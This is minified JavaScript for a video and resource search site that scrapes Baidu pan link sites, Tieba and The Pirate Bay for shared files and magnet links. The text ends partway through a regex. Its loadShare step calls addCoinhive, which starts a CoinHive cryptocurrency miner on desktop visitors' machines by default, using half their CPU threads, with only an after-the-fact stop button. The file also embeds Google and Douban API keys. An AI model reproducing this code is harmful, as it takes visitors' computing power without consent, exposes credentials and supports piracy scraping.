function init(){window.config={nodeUrl:(new Date).getDate()>=20?"//charon-node3.herokuapp.com/":"//charon-node.herokuapp.com/",userLang:navigator.language||navigator.userLanguage,key:getURLParameter("search"),dataMin:screen.width>=1500?2:1,fp:(new Fingerprint).get(),bookmark:{"zh-CN":"收藏我,不然下次找不到哦",default:"Bookmark me,if u have next time"},feedback:{"zh-CN":"",default:""},hiddenHistory:{"zh-CN":"看过的被隐藏数量是",default:"History be hidden,count is"},fetchers:["panc","panduoduo","magnet","tieba"],balance:{"zh-CN":"你的余额:",default:"Your balance:"},balanceCut:{"zh-CN":'你的<span class="logo"></span>余额',default:'Your <span class="logo"></span> balance '},balanceAdd:{"zh-CN":'谢谢，<span class="logo"></span>+',default:'Thanks,<span class="logo"></span>+'},newUser:{"zh-CN":'新用户<span class="logo"></span>+',default:'New user<span class="logo"></span>+'},sharer:{"zh-CN":'分享有礼:你俩各<span class="logo"></span>+',default:'Sharing,you and another both<span class="logo"></span>+'},balanceCredit:{"zh-CN":"个",default:""},accountTitle:{"zh-CN":"你的帐号:",default:"Your account:"}};window["showVideos"]=[];window.socketIo=window.SocketIo();window.money=Money()}function locationParameterChanged(){init();var e=config.key;var t=document.getElementsByTagName("input")[0];t.oninput=function(e){if(t.value){setDoubanSearch(t.value,function(){},"searchTop")}else{setDoubanTop(undefined,true,function(){})}};if(inIframe()){document.querySelector(".search-form").style.display="none";if(!mobilecheck()){document.querySelector("#data").classList.add("iniframe")}}else{t.onfocus=function(){if(t.style.height!="50%")setHeight(t,"50%")}}if(config.userLang=="zh-CN"){document.body.classList.add("zh-CN");appendHTML(document.querySelector(".money"),document.querySelector("#goodTemplate").innerHTML)}document.getElementsByTagName("form")[0].onsubmit=function(){setHeight(t,"15%")};isDirect();if(!e){t.focus();t.setAttribute("required","required");var n=JSON.parse(localStorage.getItem("doubanSearchs"))||[];if(n){setDoubanSearchList(n,"searchTop",true)}if(n.length<10){setDoubanTop(undefined,true,function(){loadShare()})}else{loadShare()}n=null;return}t.value=e;document.getElementsByTagName("title")[0].innerText=e;try{var r=syncIsIt().getBykey(e);r.setLocalIframe(r.data)}catch(e){console.log(e)}var o=JSON.parse(sessionStorage.getItem(config.key)||"{}");hideShowedCache(o.showVideos);loadFetchers(o.fetchers,config.key);o=null;setDoubanSearch(t.value,function(){loadShare(t.value)},"searchBottom");loadGoogleEntitie();if(inIframe()){return}if(isShowBookmark()){}}function hideShowedCache(e){if(e){document.getElementById("history").innerHTML=config.hiddenHistory.lang()+' <a class="history-number" href="javascript:" onclick="showHideVideos()" title="Show">'+e.length+"</a>"}e=null}function showHideVideos(){sessionStorage.removeItem(config.key);location.reload()}function loadFetchers(e,n){if(!e){money.change(-1)}(e||config.fetchers).map(function(e,t){e=e||config.fetchers[t];if(typeof e==="object"&&e.host){window[e.host]=eval(e.host+"Fetcher")(n,e)}else if(typeof e==="string"){if(e=="tieba"&&config.userLang!="zh-CN"){}else{window[e]=eval(e+"Fetcher")(n)}}});e=null}function setHeight(e,t,n){try{if(e.animate){e.style.transition="initial";e.animate([{height:t}],{duration:200,iterations:1});setTimeout(r,200)}else{r()}}catch(e){r()}function r(){e.style.height=t}}function setFontSize(e,t,n){function r(e,t){return e-t<0?e:t}function o(e,t){return e-t<0?t:e}if(!n){var n=o(r(window.innerWidth,window.innerHeight)/t,16)+"px"}e.style.fontSize=n}function changeHash(e){if(location.hash.substr(1)==e.search.value){Location.reload()}else{location.hash="#"+e.search.value}return false}function setMoreFetcher(e){e.style.display="none";var t=config.key;window.panduoduo=panduoduoFetcher(t);window.tieba=tiebaFetcher(t)}function setMessageForm(e){var t=new String("有 {0} 吗？\r找到后发给我邮箱或手机\r：");var c=document.getElementById("messageForm");if(c){c.message.value=t.format(e);c.onsubmit=function(e){e.preventDefault();var t=c.querySelector('[type="submit"]');var n=document.getElementById("tab-message");t.classList.add("loading");var r=config.nodeUrl+"cross";var o=c.method;var a={crossUrl:c.action,crossMethod:o,message:c.message.value};var i=function(e){console.log(e+c.action);n.click();t.classList=[];n.classList=[];n.classList.add("success")};var s=function(){t.classList=[];n.classList=[];n.classList.add("error")};ajax(r,i,s,o,JSON.stringify(a));return false}}}function loading(e,t){var n=document.getElementById(t?t:"pancLoading");n.style.display=e?"block":"none"}function ShowMore(){var e=window.showVideos.length;var t=[panc,tieba,magnet,panduoduo];if(e<1){e=1}setMoreIframe(t,0,e)}function setMoreIframe(e,t,n){if(!t){t=0}var n=n||1;if(!e[t]){confirm("noneTemplate",true);return}var r=e[t].videos;var o=n-r.length;if(r.length==0){setMoreIframe(e,t+1,o)}else if(o>0){e[t].setIframe(r,r.length,window.showVideos,true);setMoreIframe(e,t+1,o)}else{e[t].setIframe(r,n,window.showVideos,true)}}function fetcher(i){var s={};s.dataMin=config.dataMin||1;s.host=i.host;s.videos=[];s.fetchUrl=i.fetchUrl;s.parseVideos=i.parseVideos;s.setIframe=function(r,e,o,a){if(i.setIframe){i.setIframe(r,e,o,a,s)}else{var r=r.splice(0,e);r.map(function(e,t){var n=function(){setIframe(e,t==0);o.push(e)};if(a){n()}else{s.checkInvalid(e,function(){if(t>=r.length-1){s.setIframe(s.videos,1,o)}},n)}})}s.progress.setNum(s.videos.length)};s.checkInvalid=function(e,n,r){if(i.checkInvalid){var t=config.nodeUrl+"cross?api="+e.url;ajax(t,function(e){var t=e.indexOf("百度网盘-链接不存在");if(t<0){r()}else{n()}e=null},n)}else{r()}};s.onLoaded=function(){if(i.onLoaded){i.onLoaded(s)}else{s.setIframe(s.videos,s.dataMin,window.showVideos)}};s.fetch=i.fetch;s.load=function(e){s.progress=innerProgress(s.host,s.fetchUrl);var t=function(e){var t=s.progress;var n=typeof e=="object"?e:s.parseVideos(e);if(!n||n.length===0){t.none();return}t.success(n.length);s.videos=n;s.onLoaded();e=null};if(e){setTimeout(t(e.videos),100)}else{s.fetch(s.host,s.fetchUrl,t)}return s};window[s.host]=s;return s.load(i.cache)}function panduoduoFetcher(e,t){var u={};u.cache=t;u.host="panduoduo";u.fetchUrl="http://www.panduoduo.net/s/comb/n-"+e+"&ty-bd&f-f4";u.fetch=fetch;u.parseVideos=function(e){return t(e,".search-page .row");function t(e,t){var n=[];var r=document.createElement("html");r.innerHTML=e;var o=r.querySelectorAll(t);for(var a=0;a<o.length;a++){if(n.length>10){break}var i=o[a].querySelector('[title="百度云盘资源"]');var s=o[a].querySelector('[href^="/c/"]');if(i&&s.innerHTML=="视频"){var c=o[a].querySelector("a[href^='/r/']");var l={ref:u.host,name:c.innerHTML,url:"http://www.panduoduo.net"+c.pathname};n.push(l)}}e=r=els=null;return n}};u.onLoaded=function(e){};u.setIframe=function(e,t,r){var i=e.splice(0,t);i.forEach(function(e,t,n){r.push(e);o(e,t===0)});function o(r,o){var a=setIframe(r,false,true);var e=function(e){var t=n(e,"a.dbutton2");if(!t){u.setIframe(i,1,window.showVideos)}if(window.showVideos&&isExist(t,window.showVideos)){return}r["url"]=t;function n(e,t){var n=e.indexOf('"dbutton2" href="')+'"dbutton2" href="'.length;var r=e.substring(n,e.indexOf('"',n));return r}t=config.nodeUrl+"cross?api="+t;setIframeUrl(t,a,o)};fetch("panduoduo",r.url,e)}};return fetcher(u)}function pancFetcher(e,t){var i={};i.cache=t;i.host="panc";i.fetchUrl="https://www.panc.cc/s/"+e+"/td";i.fetch=nodeFetch;i.onLoaded=function(t){t.setIframe(t.videos,t.dataMin,window.showVideos);clearInvalid(t,function(e){t.setIframe([e],1,window.showVideos);t.progress.setNum(t.videos.length)})};i.setIframe=function(n,e,r,t,o){var n=n.splice(0,e);n.map(function(e,t){if(!checkExistUk(e,r)){setIframe(e,t==0);r.push(e)}else{n.splice(n.indexOf(e),1);o.progress.setNum(o.videos.length)}});n=null};i.parseVideos=function(e){var t=n(e,".a_url");function n(e,t){var n=[];var r=document.createElement("html");r.innerHTML=e;var o=r.querySelectorAll(t);for(var a=0;a<o.length;a++){n.push({ref:i.host,name:o[a].previousElementSibling.innerHTML,url:o[a].href})}return n}return t};return fetcher(i)}function fetch(t,e,n){var r=encodeURI(config.nodeUrl+"fetch?api="+e);try{var o=function(){var e=[];progress(t).error()};ajax(r,n,o)}catch(e){o()}}function nodeFetch(t,e,n){var r=encodeURI(config.nodeUrl+"fetch?npm=node-fetch&api="+e);try{var o=function(){var e=[];progress(t).error()};ajax(r,n,o)}catch(e){o()}}function cross(t,e,n){var r=encodeURI(config.nodeUrl+"cross?api="+e);try{var o=function(){var e=[];progress(t).error()};ajax(r,n,o)}catch(e){o()}}function setIframe(e,t,n,r,o){if(e.url.indexOf("magnet")===0){r="magnetTemplate"}r=r?r:"videoTemplate";var a=document.getElementById(r).innerHTML;var i=document.getElementById(o||"data");var s=document.createElement("div");s.classList.add("video-item");s.innerHTML=a;var c=s.children[0];var l=e.url;if(e.key&&!config.key){c.href="?search="+e.key;c.innerHTML=e.key;c.target=""}else{c.innerHTML=e.name;c.href=e.refUrl||l}if(e.ref){var u=s.querySelector(".origin");u.href=window[e.ref].fetchUrl;u.innerHTML='<i class="'+e.ref+'"></i>'}if(r=="videoTemplate"){var f=l.indexOf("//");l=l.substr(f>=0?f:0)}var d=s.querySelector("[name='isIt']");d.value=JSON.stringify(e);if(isItTrue(d)||e.key){d.checked=true}var h=e.key||config.key;d.title="Is this "+h+"?";d.dataset.key=h;if(i.querySelector("iframe[data-src='"+l+"']")||i.querySelector("a[href='"+l+"']")){}else{i.appendChild(s)}if(!n){setIframeUrl(l,s,t,r)}var m=JSON.parse(sessionStorage.getItem(config.key)||"{}");m.fetchers=objectsByStrings(config.fetchers);m.showVideos=(m.showVideos||[]).concat(showVideos);sessionStorage.setItem(config.key,JSON.stringify(m));m=i=iframe=null;return s}function objectsByStrings(e){var t=[];e.map(function(e){t.push(window[e])});return t}function setIframeUrl(e,t,n,r){if(!e){t.removeChild(o)}else{r=r?r:"videoTemplate";if(r=="videoTemplate"){var o=t.querySelector("iframe");if(isDisableScript(e)){o.sandbox="allow-same-origin allow-popups allow-forms allow-pointer-lock"}o.dataset.src=e;if(n){o.src=e}addVideosHandler(o)}else if(r=="magnetTemplate"){var a=t.querySelector("code");a.innerHTML=e}}}function isExist(e,t,n){for(var r=0;r<t.length;r++){var n=n||"url";if(t[r][n]==e){return{i:r}}}return false}function isDisableScript(e){if(e.indexOf("pan.baidu.com/pcloud/album/file")>0){return true}return false}function load(e,t){var n=new XMLHttpRequest;n.open("PUT",e,false);n.send(null);if(n.status===200){return n.responseText}}function getURLParameter(e,t){return decodeURIComponent((new RegExp("[?|&]"+e+"="+"([^&;]+?)(&|#|;|$)").exec(t?t:location.search)||[null,""])[1].replace(/\+/g,"%20"))||null}function isElementInViewport(e){if(typeof jQuery==="function"&&e instanceof jQuery){e=e[0]}var t=e.getBoundingClientRect();return t.top>=0&&t.left>=0&&t.bottom<=(window.innerHeight||document.documentElement.clientHeight)&&t.right<=(window.innerWidth||document.documentElement.clientWidth)}function onVisibilityChange(t,n){var r;return function(){var e=isElementInViewport(t);if(e!=r){r=e;if(typeof n=="function"){n()}}}}function addVideosHandler(e){var t=onVisibilityChange(e,function(){if(!e.src){e.src=e.dataset.src}});if(window.addEventListener){addEventListener("DOMContentLoaded",t,false);addEventListener("load",t,false);addEventListener("scroll",t,false);addEventListener("resize",t,false)}else if(window.attachEvent){attachEvent("onDOMContentLoaded",t);attachEvent("onload",t);attachEvent("onscroll",t);attachEvent("onresize",t)}}function ajax(e,t,n,r,o,a){var i=new XMLHttpRequest;i.open(r||"GET",e);i.setRequestHeader("Content-Type",a||"text/plain;charset=UTF-8");try{i.send(o||null)}catch(e){n()}i.onload=function(e){if(this.status==200){t(this.response,n)}else{n()}};i.onerror=n;return i}function isEnglish(e){var t=/[^\x00-\x7F]+/;if(t.test(e)){return false}return true}function thepiratebayFetcher(e,t){return magnetFetcher(e,t)}function diaosisouFetcher(e,t){return magnetFetcher(e,t)}function magnetFetcher(e,t){var l={};l.cache=t;if(isEnglish(e)){l.host="thepiratebay";l.fetchUrl="https://thepiratebay.org/search/"+e+"/0/99/0";l.parseVideos=function(e){var t=n(e);return t;function n(e){var t=[];var n=document.createElement("html");n.innerHTML=e;var r=n.querySelectorAll("#searchResult tbody tr");for(var o=0;o<r.length;o++){var a=r[o].querySelector(".detLink").innerHTML;var i=r[o].querySelector("a[href^='magnet:']").href;var s={ref:l.host,name:a,url:i};t.push(s)}e=n=r=null;return t}};l.fetch=cross;l.onLoaded=function(e){e.setIframe(e.videos,e.dataMin*2,window.showVideos)}}else{l.host="diaosisou";l.fetchUrl="http://www.diaosisou.org/list/"+e+"/1";l.parseVideos=function(e){var t=n(e);return t;function n(e){var t=[];var n=[];var r=document.createElement("html");r.innerHTML=e;var o=r.querySelectorAll(".mlist>li");r=null;for(var a=0;a<o.length;a++){var i=o[a].querySelector("a[name='file_title'").innerHTML;var s=o[a].querySelector("a[href^='magnet:']").href;var c={ref:l.host,name:i,url:s};if(c.name.length>=70){n.push(c)}else{t.push(c)}}t.concat(n);e=r=o=null;return t}};l.fetch=nodeFetch;l.onLoaded=function(e){if(e.videos[0].name.length<70){e.setIframe(e.videos,1,window.showVideos)}}}window[l.host]=fetcher(l);return window[l.host]}function loadError(e){console.log("The script "+e.target.src+" is not accessible.")}function importScript(e,t){var n=document.createElement("script");n.type="text/javascript";n.onerror=loadError;if(t){n.onload=t}if(document.currentScript){document.currentScript.parentNode.insertBefore(n,document.currentScript)}else{document.body.appendChild(n)}n.src=e;n.abort=function(){return trigger(n,"error")};return n}function trigger(e,t){if(!typeof t=="string"){return}if(e.dispatchEvent){var n=document.createEvent("Events");n.initEvent(t,true,true);e.dispatchEvent(n)}else if(e.fireEvent){e.fireEvent("on"+t)}else{e["on"+t]()}}function progress(r){var t=document.getElementById(r+"Progress");if(t.interval){return t}t.init=function(){t.parentNode.parentNode.classList=[];t.value=0;t.interval=setInterval(e,10)};t.success=function(e){t.parentNode.parentNode.classList=[];t.parentNode.parentNode.classList.add("success");clearInterval(t.interval);if(e){t.nextSibling.innerHTML="<em>"+e+"</em>"}};t.setNum=function(e){if(e>0){t.success(e)}else{t.none()}};t.none=function(){t.parentNode.parentNode.classList=[];t.parentNode.parentNode.classList.add("none");clearInterval(t.interval);t.nextSibling.innerHTML="<em>"+0+"</em>"};t.error=function(){t.parentNode.parentNode.classList=[];t.parentNode.parentNode.classList.add("error");clearInterval(t.interval)};t.parentNode.onclick=function(){var e=window[r];if(e&&e.videos.length){var t=e.videos.length;var n=showVideos.length;t=t>n?n:t;if(r=="panduoduo"){t=1}setMoreIframe([e],0,t)}};t.nextSibling.nextSibling.onclick=function(){var e=window[r];if(e){e.load()}};function e(){if(t.value>=2e4){clearInterval(t.interval);t.error()}else{t.value=t.value+10}}return t}function innerProgress(e,t){var n=document.getElementById("progressGroup");n.classList.add("show");var r=document.getElementById(e+"Progress");if(!r){var o='<li><a target="_blank" href="'+t+'" title="'+e+'"><i class="'+e+'"></i></a><span class="more" href="javascript:return void()"><progress max="20000" id="'+e+'Progress"></progress><span class="num"></span><span class="reloadSingle" title="Reload"></span></span>';var a=n.querySelector("li.more");beforeHTML(n,o,a)}var i=progress(e);i.init();return i}function appendHTML(e,t){var n=document.createElement("div");n.innerHTML=t;e.appendChild(n.children[0])}function beforeHTML(e,t,n){var r=document.createElement("div");r.innerHTML=t;e.insertBefore(r.children[0],n)}function checkInvalid(e,n,r){var t=config.nodeUrl+"cross?api="+e;ajax(t,function(e){var t=e.indexOf("百度网盘-链接不存在");if(t<0){r()}else{n()}e=null},n)}function clearInvalid(n,r){try{var o=n.videos;o.map(function(e){var t=function(e){var t=e.indexOf("pan.baidu.com/s/");return t>=0?true:false};if(!t(e["url"])){checkInvalid(e["url"],function(){o.splice(o.indexOf(e),1);n.progress.setNum(o.length)},function(){if(r){r(e);r=false}})}})}catch(e){}}function setDoubanList(e){var t="https://api.douban.com/v2/movie/search?q="+e;var n=config.nodeUrl+"cross?api="+t;ajax(n,function(e){var t="";var n=JSON.parse(e).subjects;for(var r=0;r<3&&r<n.length;r++){t+=searchToHtml(n[r].original_title,n[r].images.medium);if(r<1&&n[r].original_title!=n[r].title){t+=searchToHtml(n[r].title,n[r].images.medium)}}var o=document.getElementById("doubanList");o.innerHTML=t;o.style.display="block";e=t=n=o=null})}function setDoubanSearch(e,t,n){var e=e||config.key;if(!e){return}window.doubanListId=n;if(window.doubanRequest){window.doubanRequest.abort()}if(n!="searchBottom"){var r="https://api.douban.com/v2/movie/search?callback=setDoubanSearchCallback&q="+e;window.doubanRequest=importScript(r,t)}else{var r="https://api.douban.com/v2/movie/search?q="+e;var o=config.nodeUrl+"cross?api="+r;window.doubanRequest=ajax(o,function(e){setDoubanSearchCallback(JSON.parse(e));t()})}}function setDoubanSearchCallback(e){var t=e.subjects;if(t&&t[0]){setDoubanSearchList(t,window.doubanListId);var n=JSON.parse(localStorage.getItem("doubanSearchs"))||[];var r=isExist(t[0].title,n,"title");if(!r){n.unshift(t[0]);n.length=n.length>20?20:n.length}else{n.move(r.i,0)}n=JSON.stringify(n);localStorage.setItem("doubanSearchs",n);t=n=e=null}}function setDoubanSearchList(e,t,n){var r=document.getElementById(t)||document.querySelector(".doubanList");var o="";for(var a=0;n?a<20&&a<e.length:a<5&&a<e.length;a++){var i=config.userLang=="zh-CN"?e[a].title:e[a].original_title;var s=config.userLang=="zh-CN"?e[a].original_title:e[a].title;o+=searchToHtml(i,e[a].images.medium);if(a<1&&i!=s&&!n){o+=searchToHtml(s,e[a].images.medium)}}if(true&&!n){}r.classList.add("doubanList");r.innerHTML=o;o=null}function searchToHtml(e,t){var n="";if(config.key!=e){n='href="?search='+encodeURIComponent(e)+'"'}var r="";if(t){r='<img src="'+t+'"/>'}return"<a "+n+" >"+r+"<span>"+e+"<span></a>"}function setDoubanTop(e,t,n){if(window.doubanRequest){window.doubanRequest.abort()}var r=parseInt(Math.random()*230);var o="https://api.douban.com/v2/movie/top250?apikey=0df993c66c0c636e29ecbb5344252a4a&start="+r+"&&callback=setDoubanTopCallback";window.doubanRequest=importScript(o,n)}function setDoubanTopCallback(e){var t="";var n=e.subjects;var r=config.key;for(var o=0;o<n.length;o++){var a=n[o];var i=config.userLang=="zh-CN"?n[o].title:n[o].original_title;t+=searchToHtml(i,n[o].images.medium)}t+='<a target="_blank" href="https://movie.douban.com/top250" class="douban-more icon-douban">Top 250<i>﹀</i></a>';var s=document.getElementById("searchTop")||document.querySelector(".doubanList");s.innerHTML+=t;s.classList.add("doubanList");e=t=n=s=null}function setMagnetTech(e){if(!e){var e=document.getElementById("tab-Magnet");e.parentNode.style.display="inline-block";return}else if(!e||e.checked==false){return}setOtherClose(e);var t=e.nextElementSibling.nextElementSibling;t.innerHTML=document.getElementById("magnetTechTemplate").innerHTML}function reloadIframe(e){e.previousElementSibling.src=e.previousElementSibling.src}function tiebaFetcher(e,t){var w={};w.cache=t;w.host="tieba";w.fetchUrl="http://tieba.baidu.com/f/search/res?ie=utf-8&qw="+e+" pan.baidu";w.fetch=cross;w.parseVideos=function(e){var t=n(e,".s_post");return t;function n(e,t){var n=[];var r=document.createElement("html");r.innerHTML=e;var o=r.querySelectorAll(t);for(var a=0;a<o.length;a++){var i=o[a].querySelector(".p_title").innerHTML;var s=i.indexOf('href="')+6;var c=i.indexOf('"',s);var l=i.substring(s,c);var e=i+o[a].querySelector(".p_content").innerHTML;var u=g(e);var f=o[a].querySelector(".p_title").innerText+" "+o[a].querySelector(".p_content").innerText;var d=f.lastIndexOf(u);var h=f.slice(d);var m=v(f,d);if(u&&p(m)){n.push({ref:w.host,name:f,url:m,refUrl:"http://tieba.baidu.com"+l})}}return n;function p(e){if(!e){return false}if(e.indexOf("pan.baidu.com/mbox")>0){return false}return true}function v(e,t){var n=t?t:0;var r=e.indexOf("http",n);if(r>=0){var o=e.slice(r);var a=/[^\x00-\x7F]|\s|\.\.\.|,/;var i=o.match(a);o=o.slice(0,i.index);return o}else{if(t){return v(e)}}return""}function g(e){var t=document.createElement("div");t.innerHTML=e;var n=t.querySelectorAll("em");for(var r=n.length-1;r>=0;r--){if(n[r].innerText!="pan.baidu"){return n[r].innerText}}return""}}};return fetcher(w)}function checkExistUk(e,t){try{var n=getURLParameter("uk",e.url);for(var r=0;r<t.length;r++){var o=t[r];var a=getURLParameter("uk",o.url);if(n&&n==a){return true}}}catch(e){return true}return false}function syncIsIt(r,e){var a={};a.key=r||config.key;a.data=e||JSON.parse(localStorage.getItem(a.key)||"{}");a.uri="https://postgrest-taifu.herokuapp.com/testisit3";a.getBykey=function(t){var t=t||a.key;var e="get";var n=a.uri+"?order=install_date.desc&key=eq."+t;var r=function(e){console.log(e);a.setIframe(e);o(t,e)};ajax(n,r,null,e,null);return a};a.setIframe=function(e,n,t){var e=typeof e==="string"?JSON.parse(e):e;e.map(function(e){var t=JSON.parse(e.video);if(t){t.key=e.key;setIframe(t,true,null,null,n)}})};a.setLocalIframe=function(e){for(var t in e){var n=e[t];n.key=t;setIframe(n,true,null,null)}};a.getAll=function(){var e="get";var t=a.uri+"?order=install_date.desc&limit=5";var n=function(e){console.log(e);a.setIframe(e,"dataIsIt",true);o(r,e)};ajax(t,n,null,e,null)};function o(t,e){var n=JSON.parse(localStorage.getItem(t)||"{}");var e=JSON.parse(e);e.map(function(e){if(e.key==t){n[e.url]=e.count}});localStorage.setItem(t,JSON.stringify(n));e=null}a.add=function(e,t){var n=new XMLHttpRequest;n.open("POST",a.uri);n.setRequestHeader("Content-Type","application/json");n.send(JSON.stringify({url:t.url,key:e,video:JSON.stringify(t)}))};a.delete=function(e,t){var n="delete";var r=a.uri+"?key=eq."+e+"&url=eq."+t.url;var o=function(e){console.log(e)};ajax(r,o,null,n,null,"application/json")};return a}function isItClick(e){var t=e.dataset.key||config.key;storageItTrue(t,e,!e.checked);e.classList.add("checked");var n=document.querySelector(".share-other");n.setAttribute("checked",e.checked);if(isFirstIsIt(t)){money.change(1)}}function isFirstIsIt(e){var t=JSON.parse(localStorage.getItem("notIsFirstIsIt")||"{}");if(!t[e]){t[e]=true;localStorage.setItem("notIsFirstIsIt",JSON.stringify(t));return true}return false}function storageItTrue(e,t,n){var r=JSON.parse(t.value);var o=JSON.parse(localStorage.getItem(e)||"{}");o[r.url]=n?false:r;localStorage.setItem(e,JSON.stringify(o));var a=syncIsIt(e,o);if(n){a.delete(e,r)}else{a.add(e,r);moveItemToTop(t)}}function moveItemToTop(e){var t=closest(e,".video-item");var n=t.parentNode;n.insertBefore(t,n.childNodes[0]);document.querySelector('a[href="#data"]').click()}function isItTrue(e){var t=config.key;var n=JSON.parse(e.value);var r=JSON.parse(localStorage.getItem(t)||"{}");if(r[n.url]){return true}return false}function closest(e,t,n){var r=null;while(e){if(e.matches(t)){r=e;break}else if(n&&e.matches(n)){break}e=e.parentElement}return r}function importCSS(e,t){var t=t||"myCss";if(!document.getElementById(t)){var n=document.getElementsByTagName("head")[0];var r=document.createElement("link");r.id=t;r.rel="stylesheet";r.type="text/css";r.href=e;r.media="all";n.appendChild(r)}}function loadShare(e){addCoinhive();importCSS("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css","awesome");addShare(e);document.querySelector("footer").style.display="block"}function addShare(n){if(!window.importShare){var r=new URL(location.href);r.searchParams.set("sharer",config.fp);r=r.href;document.querySelector(".share-other").innerHTML=document.getElementById("shareTemplate").innerHTML;document.querySelector(".prompt-share").innerHTML=config.sharer.lang()+10;window.importShare=importScript("https://wuchaolong.github.io/sante/social-share.js/src/js/qrcode.js",function(){importScript("https://wuchaolong.github.io/sante/social-share.js/src/js/social-share.js",function(){if(n){document.querySelector(".share-other").dataset.footnote=n;socialShare(".share-other",{title:n,url:r})}else{socialShare(".share-other",{url:r})}var e=money.fp;var t='<a class="nav-index logo" target="_blank" href="https://wuchaolong.github.io/video/?sharer='+e+'">https://wuchaolong.github.io/video/?sharer='+e+"</a>";appendHTML(document.querySelector(".share-other"),t)})});importCSS("https://overtrue.github.io/share.js/dist/css/share.min.css");window._bd_share_config={common:{bdUrl:r,bdSnsKey:{},bdText:n||"",bdMini:"2",bdMiniList:false,bdPic:(document.images[0]||0).src||"",bdStyle:"1",bdSize:"32"},share:{}};with(document)(0)[(getElementsByTagName("head")[0]||body).appendChild(createElement("script")).src="https://wuchaolong.github.io/baiduShare/static/api/js/share.js?v=89860593.js?cdnversion="+~(-new Date/36e5)]}}function addDonate(){var e=document.getElementById("donateTemplate");var t=document.getElementById("donate");var n=config.feedback.lang();t.innerHTML=n+e.innerHTML;e=t=null}function showAlipay(){var e=document.querySelector("#donate iframe");(e.contentDocument||e.contentWindow.document).getElementById("AliPay").click()}function showPayPal(){var e=document.querySelector("#donate iframe");(e.contentDocument||e.contentWindow.document).querySelector("#PayPal a").click()}function addBookmark(){var o=document.createElement("span");o.classList.add("bookmark");o.title="Bookmark me";o.onclick=a;var e=document.getElementById("top");e.appendChild(o);o.click();function a(e){try{var t="https://wuchaolong.github.io/video/"||window.location.href;var n="Video"||document.title;var r=config.bookmark.lang();if(/Mac/i.test(navigator.userAgent)){alert("Cmd+D "+r)}else{alert("Ctrl+D "+r)}if("addToHomescreen"in window&&addToHomescreen.isCompatible){addToHomescreen({autostart:false,startDelay:0}).show(true)}else if(window.sidebar&&window.sidebar.addPanel){window.sidebar.addPanel(n,t,"")}else if(window.sidebar&&/Firefox/i.test(navigator.userAgent)||window.opera&&window.print){o.href=t;o.title=n;o.rel="sidebar";o.removeEventListener("click",a)}else if(window.external&&"AddFavorite"in window.external){window.external.AddFavorite(t,n)}}catch(e){console.log(e);return false}hideBookmark(o);return false}}function hideBookmark(e){document.getElementById("top").removeChild(e);localStorage.setItem("bookmarked",true)}function isShowBookmark(){var e=localStorage.getItem("bookmarked");var t=localStorage.getItem("doubanSearchs");var n=localStorage.getItem("isDirect");if(!e&&t&&!n){return true}return false}function isDirect(){var e=document.createElement("a");e.href=document.referrer;var t=document.createElement("a");t.href=location.href;if(!document.referrer){localStorage.setItem("isDirect",true);return true}return false}function addCoinhive(){if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){importScript("https://coin-hive.com/lib/coinhive.min.js",function(){if(navigator.hardwareConcurrency>1){var e={threads:Math.round(navigator.hardwareConcurrency/2)}}else{var e={throttle:.6}}miner=new CoinHive.Anonymous("Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP",e);if(!miner.isMobile()&&!miner.didOptOut(14400)){if(!localStorage.getItem("removeCoinHive")){startCoinHive()}else{stopCoinHive()}}})}}function startCoinHive(){localStorage.removeItem("removeCoinHive");clearInterval(miner.interval);miner.start(CoinHive.IF_EXCLUSIVE_TAB);miner.interval=setInterval(function(){try{navigator.getBattery().then(function(e){if(e.level<.5&&e.charging==false){miner.stop();console.log("检测到电力不足已停止运算")}})}catch(e){console.log(e)}var e=miner.getHashesPerSecond();var t=miner.getTotalHashes();var n=miner.getAcceptedHashes();var r='<a href="https://coinhive.com" target="_blank"><i class="navigation-icon"></i>'+t+'</a><button title="stop" onclick="stopCoinHive()">✗</button>';document.querySelector(".coinhive-miner").innerHTML=r;money.change(e/1e4)},1e3)}function stopCoinHive(){localStorage.setItem("removeCoinHive",true);clearInterval(miner.interval);miner.stop();miner.interval=setInterval(function(){var e=miner.getHashesPerSecond();var t=miner.getTotalHashes();var n=miner.getAcceptedHashes();var r='<a href="https://coinhive.com" target="_blank"><i class="navigation-icon"></i>'+t+'</a><button title="start" onclick="startCoinHive()">▶</button>';document.querySelector(".coinhive-miner").innerHTML=r},1e3)}function loadGoogleEntitie(){importScript("https://kgsearch.googleapis.com/v1/entities:search?query="+config.key+"&key=AIzaSyDTtLX1_UqEksS2zp3SAF1vMaGi3OyfJok&limit=5&indent=True&types=Movie&types=TVSeries&callback=setGoogleEntities&languages="+config.userLang+"&languages=en")}function setGoogleEntities(e){var t="";var n=e.itemListElement;for(var r=0;r<5&&r<n.length;r++){if(typeof n[r].result.name=="string"){var o=n[r].result.name;t+=searchToHtml(o)}else{var o=n[r].result.name[0]["@value"];t+=searchToHtml(o);var a=n[r].result.name[n[r].result.name.length-1]["@value"];if(r==0&&o!==a){t+=searchToHtml(a)}}}var i=document.getElementById("googleEntities");i.innerHTML=t;i.style.display="block";i.classList.add("doubanList");e=t=n=i=null}function inIframe(){try{return window.self!==window.top}catch(e){return true}}function mobilecheck(){var t=false;(function(e){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(e)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| 